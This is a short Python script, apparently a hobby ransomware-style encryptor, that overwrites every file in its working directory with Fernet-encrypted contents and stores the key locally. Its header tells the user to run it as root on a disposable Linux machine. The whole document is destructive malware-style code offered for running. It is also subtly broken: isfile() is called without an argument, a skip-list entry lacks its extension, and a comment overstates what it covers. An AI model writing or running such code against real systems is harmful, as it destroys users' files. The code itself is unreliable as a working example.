""""


Just tryna encrypt some files
DISCLAIMER: You will need to run this code on a Linux operating system that you are willing to not use anymore :)
REQUIREMENTS: Disposable Linux Computer, SSH Root Command, Files
INSTRUCTIONS: Run the code on the command terminal through Python 3 and you should be good


"""
import os
from cryptography.fernet import Fernet #Method used to encrypt file to only access them using a specific key

#Create variables
files = []
key = Fernet.generate_key()

#Saves key to a key file to ensure we can access the files eventually
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
    
    
#Ensure were not adding this file, the key file or the decrypting file to the list of files we want to encrypt 
for file in os.listdir():
    if file == "encrypt_files" or file == "thekey.key" or file == "decrypt_files.py":
        continue
    #Goes through every file in the operating system and appends it to the file list
    if os.path.isfile():
        files.append(file)      
    
#Encrypt the files and writes all the information to another file
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Encryption Successful")  
print(f"The following files are now encrypted: ")
print(files) 